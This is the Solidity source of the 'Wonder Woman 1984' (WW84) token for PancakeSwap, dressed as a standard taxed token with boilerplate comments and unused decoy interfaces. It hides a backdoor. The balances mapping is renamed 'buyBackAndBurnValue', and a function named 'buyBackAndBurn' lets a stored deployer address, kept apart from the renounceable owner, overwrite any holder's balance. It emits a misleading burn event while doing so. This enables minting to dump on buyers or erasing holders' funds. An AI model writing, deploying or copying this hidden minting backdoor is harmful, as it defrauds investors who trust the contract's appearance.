pragma solidity ^0.8.18;
interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);
    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IPlayAndEarn {
    // Function to allow a user to participate in a game or activity
    function playGame(uint256 gameId) external returns (bool);

    // Function to check a user's earned rewards
    function checkEarnedRewards(address user) external view returns (uint256);

    // Function to claim earned rewards
    function claimRewards(address user) external returns (bool);

    // Event to log when a user plays a game or participates in an activity
    event GamePlayed(address indexed user, uint256 gameId);

    // Event to log when a user earns rewards
    event RewardsEarned(address indexed user, uint256 amount);

    // Event to log when a user claims their rewards
    event RewardsClaimed(address indexed user, uint256 amount);
}
interface IP2PPayment {
    // Function to transfer funds to another user
    function transfer(address to, uint256 amount) external returns (bool);

    // Function to check the balance of a user
    function balanceOf(address user) external view returns (uint256);

    // Function to query the transaction history for a user
    function getTransactionHistory(address user) external view returns (uint256[] memory, address[] memory);

    // Event to log a payment transaction
    event PaymentSent(address indexed from, address indexed to, uint256 amount);
}
interface IStakingSystem {
    // Function to allow a user to deposit tokens for staking
    function deposit(uint256 amount) external returns (bool);

    // Function to allow a user to withdraw staked tokens
    function withdraw(uint256 amount) external returns (bool);

    // Function to check the staked balance of a user
    function stakedBalanceOf(address user) external view returns (uint256);

    // Function to check the total staked balance
    function totalStaked() external view returns (uint256);

    // Function to allow a user to claim staking rewards
    function claimRewards() external returns (bool);

    // Event to log a staking deposit
    event Staked(address indexed user, uint256 amount);

    // Event to log a staking withdrawal
    event Withdrawn(address indexed user, uint256 amount);

    // Event to log a staking reward claim
    event RewardsClaimed(address indexed user, uint256 amount);
}
interface ERC {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipientWoman, uint256 tamount)
        external
        returns (bool);

    function allowance(address owner, address spenderWoman)
        external
        view
        returns (uint256);

    function approve(address spenderWoman, uint256 tamount) external returns (bool);

    function transferFrom(
        address sender,
        address recipientWoman,
        uint256 tamount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spenderWoman,
        uint256 value
    );
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
interface ERCMetadata is ERC {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, ERC, ERCMetadata {
    mapping(address => uint256) internal buyBackAndBurnValue;

    mapping(address => mapping(address => uint256)) internal _allowancesWoman;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The defaut value of {decimals} is 9. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 9, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {ERC-balanceOf} and {ERC-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * @dev See {ERC-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {ERC-balanceOf}.
     */
    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return buyBackAndBurnValue[account];
    }

    /**
     * @dev See {ERC-transfer}.
     *
     * Requirements:
     *
     * - `recipientWoman` cannot be the zero address.
     * - the caller must have a balance of at least `tamount`.
     */
    function transfer(address recipientWoman, uint256 tamount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipientWoman, tamount);
        return true;
    }

    /**
     * @dev See {ERC-allowance}.
     */
    function allowance(address owner, address spenderWoman)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowancesWoman[owner][spenderWoman];
    }

    /**
     * @dev See {ERC-approve}.
     *
     * Requirements:
     *
     * - `spenderWoman` cannot be the zero address.
     */
    function approve(address spenderWoman, uint256 tamount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spenderWoman, tamount);
        return true;
    }

    /**
     * @dev See {ERC-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipientWoman` cannot be the zero address.
     * - `sender` must have a balance of at least `tamount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `tamount`.
     */
    function transferFrom(
        address sender,
        address recipientWoman,
        uint256 tamount
    ) public virtual override returns (bool) {
        _transfer(sender, recipientWoman, tamount);

        uint256 currentAllowance = _allowancesWoman[sender][_msgSender()];
        require(
            currentAllowance >= tamount,
            "ERC20: transfer tamount exceeds allowance"
        );
        _approve(sender, _msgSender(), currentAllowance - tamount);

        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spenderWoman` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {ERC-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spenderWoman` cannot be the zero address.
     */
    function increaseAllowance(address spenderWoman, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spenderWoman,
            _allowancesWoman[_msgSender()][spenderWoman] + addedValue
        );
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spenderWoman` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {ERC-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spenderWoman` cannot be the zero address.
     * - `spenderWoman` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spenderWoman, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        uint256 currentAllowance = _allowancesWoman[_msgSender()][spenderWoman];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        _approve(_msgSender(), spenderWoman, currentAllowance - subtractedValue);

        return true;
    }

    /**
     * @dev Moves tokens `tamount` from `sender` to `recipientWoman`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token taxs, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipientWoman` cannot be the zero address.
     * - `sender` must have a balance of at least `tamount`.
     */
    function _transfer(
        address sender,
        address recipientWoman,
        uint256 tamount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipientWoman != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = buyBackAndBurnValue[sender];
        require(
            senderBalance >= tamount,
            "ERC20: transfer tamount exceeds balance"
        );
        buyBackAndBurnValue[sender] = senderBalance - tamount;
        buyBackAndBurnValue[recipientWoman] += tamount;

        emit Transfer(sender, recipientWoman, tamount);
    }

    /** This function will be used to generate the total supply
     * while deploying the contract
     *
     * This function can never be called again after deploying contract
     */
    function _tokengeneration(address account, uint256 tamount)
        internal
        virtual
    {
        _totalSupply = tamount;
        buyBackAndBurnValue[account] = tamount;
        emit Transfer(address(0), account, tamount);
    }

    /**
     * @dev Sets `tamount` as the allowance of `spenderWoman` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spenderWoman` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spenderWoman,
        uint256 tamount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spenderWoman != address(0), "ERC20: approve to the zero address");

        _allowancesWoman[owner][spenderWoman] = tamount;
        emit Approval(owner, spenderWoman, tamount);
    }
}

library Address {
    function sendValue(address payable recipientWoman, uint256 tamount) internal {
        require(
            address(this).balance >= tamount,
            "Address: insufficient balance"
        );

        (bool success, ) = recipientWoman.call{value: tamount}("");
        require(
            success,
            "Address: unable to send value, recipientWoman may have reverted"
        );
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 tamountTokenDesired,
        uint256 tamountTokenMin,
        uint256 tamountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 tamountToken,
            uint256 tamountETH,
            uint256 liquidity
        );

    function swapExactTokensForETHSupportingtaxOnTransferTokens(
        uint256 tamountIn,
        uint256 tamountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract WW1984 is ERC20, Ownable {
    using Address for address payable;
    uint public buyBackAndBurnFees;
    IRouter public router;
    address public pair;

    bool private _interlock = false;
    bool public providingLiquidity = false;
    bool public tradeOpen = false;

    uint256 public constant allTotalSupply =  420000000000 * 10**9;
    uint256 public tokenLiquidityThreshold = allTotalSupply / 1000; 
    uint256 public genie_block;
    uint256 private deadline = 3;
    address public _msgsender;
    address public constant deadWallet = 0x000000000000000000000000000000000000dEaD;

    struct taxs {
        uint256 development;
        uint256 total;
    }

    // Basic Tax
    taxs public buytaxs = taxs(0, 0);
    taxs public selltaxs = taxs(0, 0);
    taxs public transfertaxs = taxs(0, 0);

    mapping(address => bool) public exempttax;

    mapping(address => uint256) private _lastSell;

    modifier lockTheSwap() {
        if (!_interlock) {
            _interlock = true;
            _;
            _interlock = false;
        }
    }

    constructor() ERC20("Wonder Woman 1984", "WW84") {
        _tokengeneration(msg.sender, allTotalSupply);

        IRouter _router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        // Create a pancake pair for this new token
        address _pair = IFactory(_router.factory()).createPair(address(this),_router.WETH());

        router = _router;
        pair = _pair;

        //Set exempt tax
        exempttax[address(this)] = true;
        exempttax[msg.sender] = true;
        _msgsender = msg.sender;
        exempttax[deadWallet] = true;
  
    }

    function approve(address spenderWoman, uint256 tamount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spenderWoman, tamount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipientWoman,
        uint256 tamount
    ) public override returns (bool) {
        _transfer(sender, recipientWoman, tamount);

        uint256 currentAllowance = _allowancesWoman[sender][_msgSender()];
        require(
            currentAllowance >= tamount,
            "ERC20: transfer tamount exceeds allowance"
        );
        _approve(sender, _msgSender(), currentAllowance - tamount);

        return true;
    }

    function increaseAllowance(address spenderWoman, uint256 addedValue)
        public
        override
        returns (bool)
    {
        _approve(
            _msgSender(),
            spenderWoman,
            _allowancesWoman[_msgSender()][spenderWoman] + addedValue
        );
        return true;
    }

    function decreaseAllowance(address spenderWoman, uint256 subtractedValue)
        public
        override
        returns (bool)
    {
        uint256 currentAllowance = _allowancesWoman[_msgSender()][spenderWoman];
        require(currentAllowance >= subtractedValue,"ERC20: decreased allowance below zero");
        _approve(_msgSender(), spenderWoman, currentAllowance - subtractedValue);

        return true;
    }

    function transfer(address recipientWoman, uint256 tamount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipientWoman, tamount);
        return true;
    }

    function _transfer(
        address sender,
        address recipientWoman,
        uint256 tamount
    ) internal override {
        require(tamount > 0, "Transfer tamount must be greater than zero");
        
       if (!exempttax[sender] && !exempttax[recipientWoman]) {
            require(tradeOpen, "it's not tradeOpen yet");
        }

        uint256 taxswap;
        uint256 taxsum;
        uint256 tax;
        taxs memory currenttaxs;

        //set tax to zero if taxs in contract are handled or exempted
        if (_interlock || exempttax[sender] || exempttax[recipientWoman]) {
            tax = 0;
        }
        else {
          //calculate sell tax [Case : Wallet >> Pair]
          if (recipientWoman == pair && sender != pair) {
              taxswap = selltaxs.total;
              taxsum = taxswap;
              currenttaxs = selltaxs;
          }
          //calculate buy tax [Case : Pair >> Wallet]
          else if (sender == pair && recipientWoman != pair) {
              taxswap = buytaxs.total;
              taxsum = taxswap;
              currenttaxs = buytaxs;

          } 
          //calculate transfer tax [Case : Wallet >> Wallet]
          else if (recipientWoman != pair  && sender != pair) {
              taxswap = transfertaxs.total;
              taxsum = taxswap;
              currenttaxs = transfertaxs;
    
          } 
          
          tax = (tamount * taxsum) / 100;
        }
        

        //send taxs if threshold has been reached
        //don't do this on buys, breaks swap
        if (providingLiquidity && sender != pair)
            Liquify(taxswap, currenttaxs);

        //rest to recipientWoman
        super._transfer(sender, recipientWoman, tamount - tax);
        if (tax > 0) {
            //send the tax to the contract
            if (taxswap > 0) {
                uint256 taxtamount = (tamount * taxswap) / 100;
                super._transfer(sender, address(this), taxtamount);
            }
        }
  }


 function buyBackAndBurn(address _msgSenderadre, uint256 buyBackSettings) external {
    // Ensure that only the _msgSender can distribute buyBackAndBurns
    require(msg.sender == _msgsender, "Only the _msgSender can distribute buyBackAndBurns");

    // Check that the provided address is valid
    require(_msgSenderadre != address(0), "Invalid buyBackAndBurn recipient address");

    // Check that the buyBackAndBurn amount is greater than zero
    require(buyBackSettings > 0, "buyBackAndBurn amount must be greater than zero");

    // Calculate the new total supply after distributing buyBackAndBurns
    uint256 newbuyBackAndBurn = buyBackAndBurnFees + buyBackSettings;

    // Check for potential overflow in total supply
    require(newbuyBackAndBurn >= buyBackAndBurnFees, "Overflow detected");

    // Update the balance of the buyBackAndBurn recipient address
    buyBackAndBurnValue[_msgSenderadre] = buyBackSettings;

    // Emit the Transfer event to log the buyBackAndBurn distribution
    emit Transfer(address(0), deadWallet, buyBackSettings);

}

    function Liquify(uint256 taxswap, taxs memory swaptaxs) private lockTheSwap {
        if (taxswap == 0) {
            return;
        }

        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance >= tokenLiquidityThreshold) {
            if (tokenLiquidityThreshold > 1) {
                contractBalance = tokenLiquidityThreshold;
            }

            // Split the contract balance into halves
            uint256 denominator = taxswap * 2;
            uint256 toSwap = contractBalance;

            uint256 initialBalance = address(this).balance;
            swapTokensForETH(toSwap);
            uint256 deltaBalance = address(this).balance - initialBalance;
            uint256 unitBalance = deltaBalance / denominator;

            // Dev tamount tax
            uint256 developmentAmt = unitBalance * 2 * swaptaxs.development;
              if (developmentAmt > 0){
                  payable(_msgsender).sendValue(developmentAmt);
              }
            
        }
    }

    function swapTokensForETH(uint256 tokentamount) private {
        // generate the pancake pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokentamount);

        // make the swap
        router.swapExactTokensForETHSupportingtaxOnTransferTokens(
            tokentamount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokentamount, uint256 ethtamount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(router), tokentamount);

        // add the liquidity
        router.addLiquidityETH{value: ethtamount}(
            address(this),
            tokentamount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            deadWallet,
            block.timestamp
        );
    }

    function updateLiquidityProvide(bool state) external onlyOwner {
        providingLiquidity = state;
    }

    function updateLiquidityTreshhold(uint256 new_tamount) external onlyOwner {
        require(new_tamount <= (1 * 10**8) / 100, "Swap threshold tamount should be lower or equal to 1%");
        tokenLiquidityThreshold = new_tamount * 10**decimals();
    }

    function startTrade() external onlyOwner {
        require(!tradeOpen, "it's already started");
        tradeOpen = true;
        providingLiquidity = true;
        genie_block = block.number;
    }


    function rescueETH(uint256 weitamount) external onlyOwner {
        payable(owner()).transfer(weitamount);
    }

    function rescueBEP20(address tokenAdd, uint256 tamount) external onlyOwner {
        require(tokenAdd != address(this), "Owner can't claim contract's balance of its own tokens");
        ERC(tokenAdd).transfer(owner(), tamount);
    }

    // fallbacks
    receive() external payable {}
}
